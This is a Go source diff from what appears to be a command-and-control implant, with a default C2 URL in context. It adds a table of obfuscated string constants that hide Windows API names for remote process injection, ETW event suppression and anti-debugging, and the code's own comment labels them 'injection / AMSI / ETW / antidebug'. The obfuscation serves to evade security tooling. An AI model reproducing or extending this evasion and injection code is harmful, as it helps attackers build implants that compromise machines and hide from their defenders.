@@ -68,6 +68,29 @@ const (
 
 	// Default C2 URL fallback (used only when no config blob is injected)
 	SC2DefaultURL = "48b37a32e5dd291af634488823fc2aacae9f43c43b:IMcOQt/yBivEA2a4DcwEnZSnc/wL" // "http://127.0.0.1:8080"
+
+	// High-signal Windows API names (injection / AMSI / ETW / antidebug)
+	SProcOpenP              = "9982a8d44238a5e7380264:1vLNuhJKyoRdcRc="                // "OpenProcess"
+	SProcVAllocEx           = "6460c004f7f83ea20482dc277281:MgmycIKZUuNo7rNEN/k="     // "VirtualAllocEx"
+	SProcWPMem       = "320d88d82ed5fa369c7727bd3e46ce7ecf65:ZX/hrEuFiFn/ElTOcyOjEb0c" // "WriteProcessMemory"
+	SProcCRThread       = "3c0833a070fd04d9fd903cfc7e4bb8dff8dd:f3pWwQSYVryQ/0iZKiPKupm5" // "CreateRemoteThread"
+	SProcVFreeEx            = "4cb7abf07b28329d7746614801:Gt7ZhA5JXtsFIwQNeQ=="       // "VirtualFreeEx"
+	SProcVPEx         = "354c49392e33b31d99b8306a254dcde8:YyU7TVtS303r10QPRjmIkA==" // "VirtualProtectEx"
+	SProcQUAPC             = "30780c39a4aee1907b39050b:YQ1pTMH7kvUJeFVI"             // "QueueUserAPC"
+	SProcGModuleW         = "4b682c02ca64a9609e96238f96d45c62:DA1YT6UA3Az73kLh8rg5NQ==" // "GetModuleHandleW"
+	SProcGProcAddr           = "50b3af2ef45efad675fb042643e7:F9bbfoYxmZcRn3ZDMJQ="     // "GetProcAddress"
+	SProcVProtect           = "313ffa383ced2930ca39cb57a2c0:Z1aITEmMRWC4Vr8ywbQ="     // "VirtualProtect"
+	SProcNtQIP = "aead3cd2a165b1fff41a100aad67de217f74fa1eaf464321ca:4Nltp8QXyLaafH94wAaqSBAaqmzAJSZSuQ==" // "NtQueryInformationProcess"
+	SProcNtSIT   = "9c33234b2ef6defe8583d81ce8f1697e612b190ecee8:0kdwLlq/sJjq8bV9nJgGEDVDa2uvjA==" // "NtSetInformationThread"
+	SProcNtC                  = "712e1b44fc1a71:P1pYKJNpFA=="                          // "NtClose"
+	SProcGCThread         = "9518b44eef1490da25da25c8f00db5cd:0n3ADZpm4r9LrnGggmjUqQ==" // "GetCurrentThread"
+	SProcGCTId       = "dd38a5ba8b4dad6a5fef0e51daf2a9283e4d:ml3R+f4/3w8xm1o5qJfITHcp" // "GetCurrentThreadId"
+	SProcOThread               = "87382fe07f11c1cbfad5:yEhKjit5s66bsQ=="                // "OpenThread"
+	SProcEtwFull        = "8ebad20b09080badf5be6afbec5b2b9681:y86lTn9tZdmizAOPiR1e+u0=" // "EtwEventWriteFull"
+	SProcNtQSI = "b89c02863f8212ba036d33e68e209466de728c85031163bd:9uhT81rwa+l6HkeD42n6ALEA4eR3eAzT" // "NtQuerySystemInformation"
+	SProcMitPolicy = "ff9c67ddd18c87b4adfbd4924732c5a2a0418ceec9c2b6ae6468:rPkTjaPj5NHeiJn7M1uiw9Qo44CZrdrHBxE=" // "SetProcessMitigationPolicy"
+	SProcAddVEH = "a8ba46465c5a93766cd36de8e1e4f67c7003be39468eaacdeb287a:6d4iEDk55xketgmtmYeTDARq0VcO78Sph00I" // "AddVectoredExceptionHandler"
+	SProcRemVEH = "7c983b79f7321fdfbea92a856d4af8f34099cc3991790222028eac11c291:Lv1WFoFXSbrd3UX3CC69iyP8vE34FmxqY+DIfafj" // "RemoveVectoredExceptionHandler"
 )
 
 //go:noinline
